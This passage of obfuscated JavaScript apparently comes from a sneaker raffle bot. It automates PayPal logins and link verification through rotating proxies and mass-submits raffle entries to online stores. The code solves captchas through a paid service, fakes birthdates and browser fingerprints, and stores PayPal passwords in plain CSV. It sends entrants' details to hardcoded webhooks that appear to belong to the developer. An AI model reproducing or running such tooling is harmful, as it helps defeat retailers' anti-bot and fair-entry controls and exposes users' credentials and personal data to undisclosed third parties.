        var _0x35c0b5 = '', _0x4b31f6 = 0x0;
    async function _0x486b4d() {
        var _0xf4fb28 = _0x457b0a['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x3e8bdd = _0x1b57da['parse'](_0xf4fb28, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x1d530c = 0x0; _0x1d530c < _0x3e8bdd['length']; _0x1d530c++) {
            console['log']('(' + _0x1d530c + ')\x20' + _0x3e8bdd[_0x1d530c]['Email']);
        }
        console['log']('\x0a(' + _0x3e8bdd['length'] + ')\x20' + _0x1ac777['cyan']('Add\x20a\x20new\x20account'));
        let _0xdc47d8 = await _0x4bf4a7['get']('Option');
        if (_0xdc47d8['Option'] < _0x3e8bdd['length'])
            return _0x3e8bdd[_0xdc47d8['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x69df57 = {}, _0xa0402f = await _0x4bf4a7['get']('Email');
        _0x69df57['Email'] = _0xa0402f['Email'];
        var _0x2a889d = Math['round'](Math['random']() * (_0x518414['length'] - 0x1));
        _0x69df57['Proxy'] = _0x518414[_0x2a889d], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x3d794f = await _0x4bf4a7['get']('Password');
        return _0x69df57['Password'] = _0x3d794f['Password'], _0x457b0a['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x69df57['Email'] + ',' + _0x69df57['Password'] + ',' + _0x69df57['Proxy']), _0x69df57;
    }
    let _0x512003 = await _0x486b4d();
    var _0x4b3cba = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x4af1b1 = await _0x4bf4a7['get']('Amount'), _0x4960fa = _0x4af1b1['Amount'];
    async function _0x24f597() {
        let _0x31658b = 0x0;
        var _0x3207c4 = new _0x517e1b({
            'user': _0x79d23a['masterMail'],
            'password': _0x79d23a['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x4fc3bd(_0x49e70f) {
            _0x3207c4['openBox']('INBOX', ![], _0x49e70f);
        }
        _0x3207c4['once']('ready', function () {
            _0x4fc3bd(function (_0x1f86fa, _0x260643) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x1f86fa)
                    throw _0x1f86fa;
                _0x3207c4['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x5901d2, _0x1d2b19) {
                    if (!_0x1d2b19 || !_0x1d2b19['length'])
                        console['log'](_0x3d201d() + '\x20[' + _0x4511b6 + ']\x20No\x20mails\x20found'), _0x3207c4['end']();
                    else {
                        _0x1d2b19 = _0x1d2b19['slice'](0x0, _0x4960fa);
                        var _0x3bfe9e = _0x3207c4['seq']['fetch'](_0x1d2b19, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x3bfe9e['on']('message', function (_0x3bc61d, _0x347559) {
                            var _0x163bc2 = '(#' + _0x347559 + ')\x20';
                            _0x3bc61d['on']('body', function (_0x441afe, _0x3af2c8) {
                                _0xa13a33(_0x441afe, (_0x16bebb, _0x47d5b1) => {
                                    if (_0x47d5b1['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x47d5b1['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x47d5b1['text']['split']('[')[0x2];
                                        var _0x37de1f = mes['split'](']')[0x0];
                                        _0x4b3cba['push'](_0x37de1f);
                                    }
                                });
                            }), _0x3bc61d['once']('end', function () {
                                _0x31658b++;
                            });
                        }), _0x3bfe9e['once']('error', function (_0x4b2eff) {
                            console['log']('Fetch\x20error:\x20' + _0x4b2eff);
                        }), _0x3bfe9e['once']('end', function () {
                            _0x3207c4['end']();
                        });
                    }
                });
            });
        }), _0x3207c4['once']('error', function (_0x507045) {
            console['log'](_0x1ac777['red'](_0x507045['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x3207c4['once']('end', async function () {
        }), _0x3207c4['connect']();
    }
    try {
        _0x24f597(), await _0x289b0b(0xfa0), console['log']('Found\x20' + _0x4b3cba['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x289b0b(0xfa0);
    }
    var _0x3e5bdf;
    _0x25b0b6('' + _0x4511b6);
    var _0x2e59c0 = _0x512003['Proxy']['split'](':'), _0xf69444;
    try {
        _0xf69444 = await _0x2926d5['launch']({
            'userDataDir': 'sessions/' + _0x512003['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2e59c0[0x0] + ':' + _0x2e59c0[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0xf69444 = await _0x2926d5['launch']({
            'userDataDir': 'sessions/' + _0x512003['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2e59c0[0x0] + ':' + _0x2e59c0[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x3d201d() + '\x20[' + _0x4511b6 + ']\x20Getting\x20Session');
        const _0x5b127b = await _0xf69444['newPage']();
        await _0x5b127b['authenticate']({
            'username': '' + _0x2e59c0[0x2],
            'password': '' + _0x2e59c0[0x3]
        }), await _0x5b127b['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x5b127b['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x3d201d() + '\x20[' + _0x4511b6 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x5b127b['waitForSelector']('#email');
            let _0x1f3e96 = await _0x5b127b['$eval']('#email', _0x128b7b => _0x128b7b['getAttribute']('value'));
            if (_0x1f3e96 == '') {
                await _0x5b127b['type']('#email', _0x512003['Email']), await _0x289b0b(0x1d3);
                let _0x3d3eec = await _0x5b127b['$']('#splitPassword');
                _0x3d3eec && (await _0x5b127b['click']('#btnNext'), await _0x289b0b(0xa28)), await _0x5b127b['type']('#password', _0x512003['Password']), await _0x289b0b(0x35c), await _0x5b127b['click']('#btnLogin');
            } else
                await _0x5b127b['type']('#password', _0x512003['Password']), await _0x289b0b(0x35c), await _0x5b127b['click']('#btnLogin');
            await _0x5b127b['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x3d201d() + '\x20[' + _0x4511b6 + ']\x20Successfully\x20logged\x20in'), await _0x289b0b(0x2710);
        } catch (_0x46ac07) {
            throw new Error('Login\x20session\x20expired\x20' + _0x46ac07);
        }
        for (var _0x4345ad = 0x0; _0x4345ad < _0x4b3cba['length']; _0x4345ad++) {
            console['log'](_0x3d201d() + '\x20[' + _0x4511b6 + ']\x20Task\x20' + (_0x4345ad + 0x1) + '\x20:\x20Starting\x20Verification'), _0x25b0b6(_0x4511b6 + '\x20Task\x20' + (_0x4345ad + 0x1) + '\x20/\x20' + _0x4b3cba['length']);
            const _0x44598b = await _0xf69444['newPage']();
            await _0x44598b['goto']('' + _0x4b3cba[_0x4345ad], { 'waitUntil': 'networkidle2' }), await _0x289b0b(0xbb8);
            try {
                const _0x1a10f9 = await _0x44598b['$']('#challenge-heading');
                _0x1a10f9 && (console['log'](_0x3d201d() + '\x20[' + _0x4511b6 + ']\x20Task\x20' + (_0x4345ad + 0x1) + '\x20:\x20' + _0x1ac777['yellow']('2FA\x20Required')), await _0x44598b['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x289b0b(0x9c40), await _0x44598b['waitForSelector']('#payment-submit-btn'), await _0x44598b['$eval']('#payment-submit-btn', _0x2c703d => _0x2c703d['click']()), await _0x44598b['click']('#payment-submit-btn');
                try {
                    await _0x44598b['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x289b0b(0x5dc), console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x4511b6 + ']\x20Task\x20' + (_0x4345ad + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x42a6d2) {
                    _0x35c0b5 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x42a6d2['message']);
                } finally {
                    if (_0x35c0b5 == 'yes' && _0x4b31f6 != 0x2) {
                        console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x4511b6['name'] + ']\x20Task\x20' + (_0x4345ad + 0x1) + '\x20:\x20Retrying\x20(' + _0x4b31f6 + '\x20/\x205)')), _0x4345ad = _0x4345ad - 0x1, _0x4b31f6 = _0x4b31f6 + 0x1;
                        continue;
                    }
                    _0x35c0b5 == 'yes' && _0x4b31f6 >= 0x2 && (_0x5f4429(csv[_0x4345ad], _0x4511b6), _0x35c0b5 = 'no', _0x4b31f6 = 0x0), await _0x44598b['close'](), await _0x289b0b(0x4650);
                }
            } catch (_0x175510) {
                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x4511b6 + ']\x20Task\x20' + (_0x4345ad + 0x1) + '\x20:\x20' + _0x175510));
            }
        }
    } catch (_0x29fe6a) {
        console['log'](_0x1ac777['red']('' + _0x29fe6a));
    } finally {
        await _0xf69444['close']();
    }
}
const _0x1e8c04 = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0x220b51, _0x4ba401, _0x20fe8b) {
                _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x79d23a['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1830ca = 0x0; _0x1830ca < _0x4ba401['length']; _0x1830ca++) {
                    if (_0x37fd0c != 'yes')
                        var _0x37fd0c = '', _0x808a6c = 0x0;
                    var _0x56285a;
                    try {
                        await _0x5af4d5(_0x4ba401, _0x1830ca);
                    } catch {
                        _0x37fd0c = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0x25b0b6(_0x220b51['name'] + '\x20Task\x20' + (_0x1830ca + 0x1) + '\x20/\x20' + _0x4ba401['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                    var _0x729523 = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0x29d51e = Math['round'](Math['random']() * (_0x729523['length'] - 0x1));
                    _0x4ba401[_0x1830ca]['Size'] == 'RANDOM' && (_0x4ba401[_0x1830ca]['Size'] = _0x729523[_0x29d51e]);
                    var _0x22ce07 = Math['round'](Math['random']() * (_0x20fe8b['length'] - 0x1)), _0x30ae3a = _0x20fe8b[_0x22ce07]['split'](':'), _0x3b5adf;
                    try {
                        _0x3b5adf = await _0x2926d5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x30ae3a[0x0] + ':' + _0x30ae3a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x3b5adf = await _0x2926d5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x30ae3a[0x0] + ':' + _0x30ae3a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0x3d201d() + '\x20[' + _0x220b51['name'] + ']\x20Task\x20' + (_0x1830ca + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x257673 = await _0x3b5adf['newPage']();
                        await _0x257673['authenticate']({
                            'username': '' + _0x30ae3a[0x2],
                            'password': '' + _0x30ae3a[0x3]
                        }), await _0x257673['setRequestInterception'](!![]), _0x257673['on']('request', _0x563fce => {
                            _0x563fce['resourceType']() === 'image' || _0x563fce['resourceType']() === 'font' || _0x563fce['resourceType']() === 'media' ? _0x563fce['abort']() : _0x563fce['continue']();
                        }), await _0x257673['goto'](_0x4ba401[_0x1830ca]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3d201d() + '\x20[' + _0x220b51['name'] + ']\x20Task\x20' + (_0x1830ca + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x289b0b(0x3e8), await _0x257673['waitForSelector']('#accept-all-gdpr'), await _0x257673['click']('#accept-all-gdpr'), await _0x257673['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0x289b0b(0xbb8);
                        let _0x4b9e52 = await _0x257673['$$']('button');
                        for (button of _0x4b9e52) {
                            let _0x357052 = await _0x257673['evaluate'](_0xb9d99e => _0xb9d99e['innerHTML'], button);
                            if (_0x357052['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x289b0b(0x1388), await _0x257673['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0x3d201d() + '\x20[' + _0x220b51['name'] + ']\x20Task\x20' + (_0x1830ca + 0x1) + '\x20:\x20Checking\x20Information'), await _0x289b0b(0x3e8);
                        let _0x4abd2c = await _0x257673['$$']('input[name=\x22email\x22]');
                        await _0x4abd2c[0x1]['click'](), await _0x289b0b(0x12c), await _0x257673['keyboard']['type'](_0x4ba401[_0x1830ca]['Email']), await _0x289b0b(0x1c2), await _0x257673['type']('input[name=\x22Nombre\x22]', _0x4ba401[_0x1830ca]['FirstName'] + '\x20' + _0x4ba401[_0x1830ca]['LastName']), await _0x289b0b(0x1c2), await _0x257673['type']('input[name=\x22Direccion\x22]', _0x4ba401[_0x1830ca]['Address1'] + '\x20' + _0x4ba401[_0x1830ca]['HouseNumber'] + '\x20' + _0x4ba401[_0x1830ca]['Address2']), await _0x289b0b(0x1c2), await _0x257673['type']('input[name=\x22Ciudad\x22]', _0x4ba401[_0x1830ca]['City']), await _0x289b0b(0x1c2), await _0x257673['type']('input[name=\x22Provincia\x22]', _0x4ba401[_0x1830ca]['State']), await _0x289b0b(0x1c2), await _0x257673['type']('input[name=\x22CP\x22]', _0x4ba401[_0x1830ca]['Zip']), await _0x289b0b(0x1c2), await _0x257673['select']('select[name=\x22Pais\x22]', _0x4ba401[_0x1830ca]['Country']), await _0x289b0b(0x1c2), await _0x257673['type']('input[name=\x22Telefono\x22]', _0x4ba401[_0x1830ca]['Phone']), await _0x289b0b(0x1c2), await _0x257673['type']('input[name=\x22cumple\x22]', _0xa85770(0x1, 0x14) + '-' + _0xa85770(0x1, 0xb) + '-' + _0xa85770(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0x289b0b(0x1c2), await _0x257673['type']('input[name=\x22Instagram\x22]', _0x4ba401[_0x1830ca]['Follower']), await _0x289b0b(0x1c2), await _0x257673['type']('input[name=\x22Talla\x22]', _0x4ba401[_0x1830ca]['Size']), await _0x289b0b(0x1f4), await _0x257673['click']('#sexo_hombre'), await _0x289b0b(0x1f4), await _0x257673['click']('#idioma_ingles'), await _0x289b0b(0x1f4), await _0x257673['click']('#privacidad_si'), await _0x289b0b(0x1f4), await _0x257673['click']('#acepta_suscripcion_si'), await _0x289b0b(0x1f4), console['log'](_0x3d201d() + '\x20[' + _0x220b51['name'] + ']\x20Task\x20' + (_0x1830ca + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x3bfb28 = await _0x257673['$$']('button');
                        for (button of _0x3bfb28) {
                            let _0x5cefbf = await _0x257673['evaluate'](_0x757cee => _0x757cee['innerHTML'], button);
                            if (_0x5cefbf['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x289b0b(0x1388), console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x220b51['name'] + ']\x20Task\x20' + (_0x1830ca + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x37fd0c = '';
                        var _0x977b6b = await _0x117512(_0x4ba401[_0x1830ca], _0x220b51, 'dev', ![]), _0x5b48d6 = await _0x117512(_0x4ba401[_0x1830ca], _0x220b51, 'pub', ![]);
                        const _0x26b64f = {
                            'succesDEVMSG': { 'embeds': [_0x977b6b] },
                            'succesPUBMSG': { 'embeds': [_0x5b48d6] }
                        };
                        try {
                            _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x26b64f['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x26b64f['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x1d7baa, _0x26b64f['succesPUBMSG']);
                        } catch (_0x28778a) {
                            console['log'](_0x1ac777['yellow'](_0x3d201d() + '\x20[' + _0x220b51['name'] + ']\x20Task\x20' + (_0x1830ca + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x28778a));
                        }
                    } catch (_0x219afb) {
                        console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x220b51['name'] + ']\x20Task\x20' + (_0x1830ca + 0x1) + '\x20:\x20' + _0x219afb)), _0x56285a = '' + _0x219afb;
                        var _0xab0548 = await _0x117512(_0x4ba401[_0x1830ca], _0x220b51, 'dev', !![], _0x56285a), _0x977b6b = await _0x117512(_0x4ba401[_0x1830ca], _0x220b51, 'dev', ![]), _0x5b48d6 = await _0x117512(_0x4ba401[_0x1830ca], _0x220b51, 'pub', ![]);
                        const _0x411e7f = {
                            'succesDEVMSG': { 'embeds': [_0x977b6b] },
                            'succesPUBMSG': { 'embeds': [_0x5b48d6] }
                        };
                        _0x411e7f['errorDEV'] = { 'embeds': [_0xab0548] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x411e7f['errorDEV']), await _0x15c654(_0x34ab86, _0x411e7f['errorDEV']), _0x219afb != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x37fd0c = 'yes');
                    } finally {
                        _0x3b5adf['close']();
                        if (_0x37fd0c == 'yes' && _0x808a6c != 0x5 && _0x56285a != 'Size\x20Not\x20Found') {
                            console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x220b51['name'] + ']\x20Task\x20' + (_0x1830ca + 0x1) + '\x20:\x20Retrying\x20(' + _0x808a6c + '\x20/\x205)\x20')), _0x1830ca = _0x1830ca - 0x1, _0x808a6c = _0x808a6c + 0x1;
                            continue;
                        }
                        _0x37fd0c == 'yes' && _0x808a6c >= 0x5 && (_0x5f4429(_0x4ba401[_0x1830ca], _0x220b51), _0x37fd0c = 'no', _0x808a6c = 0x0), console['log'](_0x3d201d() + '\x20[' + _0x220b51['name'] + ']\x20Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x122d3c, _0x356ca1, _0x1d78f0) {
                for (var _0x204f1b = 0x0; _0x204f1b < _0x356ca1['length']; _0x204f1b++) {
                    _0x79d23a['AfewDelay'] = _0x79d23a['delay'];
                    var _0x2cdfe9;
                    if (_0x3418ba != 'yes')
                        var _0x3418ba = '', _0xef399 = 0x0;
                    var _0x1feb46 = _0x356ca1[_0x204f1b]['Url'], _0x123ee1 = _0x356ca1[_0x204f1b];
                    _0x25b0b6(_0x122d3c['name'] + '\x20Task\x20' + (_0x204f1b + 0x1) + '\x20/\x20' + _0x356ca1['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                    try {
                        await _0x5af4d5(_0x356ca1, _0x204f1b);
                    } catch {
                        _0x3418ba = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x1f92e7(_0x5463c3) {
                        const _0x15a646 = _0x457b0a['readFileSync']('../successful-tasks.csv', 'utf8'), _0x45890f = _0x1b57da['parse'](_0x15a646, { 'header': !![] })['data'];
                        let _0x2642cf = ![];
                        for (var _0x3c9664 of _0x45890f) {
                            if (_0x3c9664['Url'] == _0x5463c3['Url'] && _0x3c9664['Email'] == _0x5463c3['Email']) {
                                _0x2642cf = !![];
                                break;
                            }
                        }
                        return _0x2642cf;
                    }
                    if (await _0x1f92e7(_0x356ca1[_0x204f1b]) == !![]) {
                        console['log'](_0x3d201d() + '\x20[' + _0x122d3c['name'] + ']\x20Task\x20' + (_0x204f1b + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x2ddfc0 = await _0x117512(_0x356ca1[_0x204f1b], _0x122d3c, 'dev', ![]), _0x4c8c56 = await _0x117512(_0x356ca1[_0x204f1b], _0x122d3c, 'pub', ![]);
                    const _0x32c126 = {
                        'succesDEVMSG': { 'embeds': [_0x2ddfc0] },
                        'succesPUBMSG': { 'embeds': [_0x4c8c56] }
                    };
                    if (_0x356ca1[_0x204f1b]['Email'] == '' || _0x356ca1[_0x204f1b]['FirstName'] == '' || _0x356ca1[_0x204f1b]['LastName'] == '' || _0x356ca1[_0x204f1b]['Country'] == '' || _0x356ca1[_0x204f1b]['Size'] == '' || _0x356ca1[_0x204f1b]['Address1'] == '' || _0x356ca1[_0x204f1b]['Zip'] == '') {
                        console['log'](_0x3d201d() + '\x20[' + _0x122d3c['name'] + ']\x20Task\x20' + (_0x204f1b + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x79d23a['useRandomProxy'] = ![])
                        var _0xc4ade4 = _0x1d78f0[_0x204f1b]['split'](':');
                    else
                        var _0x417a84 = Math['round'](Math['random']() * (_0x1d78f0['length'] - 0x1)), _0xc4ade4 = _0x1d78f0[_0x417a84]['split'](':');
                    var _0x3f4c39;
                    try {
                        _0x3f4c39 = await _0x2926d5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xc4ade4[0x0] + ':' + _0xc4ade4[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x3f4c39 = await _0x2926d5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xc4ade4[0x0] + ':' + _0xc4ade4[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x3d2ea7 = JSON['parse'](_0x457b0a['readFileSync']('sizes.json', 'utf-8')), _0x1feb46 = _0x356ca1[_0x204f1b]['Url'], _0x38dcd0 = _0x356ca1[_0x204f1b]['Size'], _0x54890e;
                        async function _0x2a303f() {
                            var _0x40f27f = new _0x55f1ec['CookieJar']();
                            console['log'](_0x3d201d() + '\x20[' + _0x122d3c['name'] + ']\x20Task\x20' + (_0x204f1b + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x34a849;
                            let _0x590bf8 = {
                                'method': 'GET',
                                'cookieJar': _0x40f27f,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0xc4ade4[0x2] + ':' + _0xc4ade4[0x3] + '@' + _0xc4ade4[0x0] + ':' + _0xc4ade4[0x1]
                            }, _0x35eed8 = _0x1feb46['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x178ec4 = _0x35eed8 + '.json', _0x3a64b5 = await _0x500c10(_0x178ec4);
                            console['log'](_0x3d201d() + '\x20[' + _0x122d3c['name'] + ']\x20Task\x20' + (_0x204f1b + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x4c6f91 = _0x3a64b5['data']['product']['variants'];
                            if (_0x38dcd0 != 'RANDOM') {
                                if (_0x4c6f91[0x1]['option1']['includes']('W')) {
                                    const _0x545589 = _0x3d2ea7['women']['find'](_0x5cc520 => _0x5cc520['EUsize'] === _0x38dcd0);
                                    _0x545589 && (_0x38dcd0 = _0x545589['size']);
                                } else {
                                    if (_0x4c6f91[0x1]['option1']['includes']('Y')) {
                                        const _0x3b6da1 = _0x3d2ea7['GS']['find'](_0x389e8f => _0x389e8f['EUsize'] === _0x38dcd0);
                                        _0x3b6da1 && (_0x38dcd0 = _0x3b6da1['size']);
                                    } else {
                                        const _0x5b7235 = _0x3d2ea7['men']['find'](_0x4fcb63 => _0x4fcb63['EUsize'] === _0x38dcd0);
                                        _0x5b7235 && (_0x38dcd0 = _0x5b7235['size']);
                                    }
                                }
                                for (var _0x27683b of _0x4c6f91) {
                                    _0x27683b['option1'] == _0x38dcd0 && (_0x34a849 = _0x27683b['id']);
                                }
                            } else {
                                var _0x53c345 = Math['round'](Math['random']() * (_0x4c6f91['length'] - 0x1));
                                _0x34a849 = _0x4c6f91[_0x53c345]['id'];
                            }
                            console['log'](_0x3d201d() + '\x20[' + _0x122d3c['name'] + ']\x20Task\x20' + (_0x204f1b + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x500c10('https://raffles.afew-store.com/cart/' + _0x34a849 + ':1'), _0x54890e = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x2a303f();
                        } catch (_0x8696ea) {
                            if (_0x8696ea['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x8696ea);
                        }
                        const _0x2db9b1 = await _0x3f4c39['newPage']();
                        await _0x2db9b1['setDefaultNavigationTimeout'](0x1d4c0), await _0x2db9b1['authenticate']({
                            'username': '' + _0xc4ade4[0x2],
                            'password': '' + _0xc4ade4[0x3]
                        }), await _0x2db9b1['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2db9b1['setRequestInterception'](!![]), _0x2db9b1['on']('request', _0xc33006 => {
                            _0xc33006['resourceType']() === 'image' || _0xc33006['resourceType']() === 'font' || _0xc33006['resourceType']() === 'media' ? _0xc33006['abort']() : _0xc33006['continue']();
                        });
                        try {
                            await _0x2db9b1['goto'](_0x54890e, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x3d201d() + '\x20[' + _0x122d3c['name'] + ']\x20Task\x20' + (_0x204f1b + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x2db9b1['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
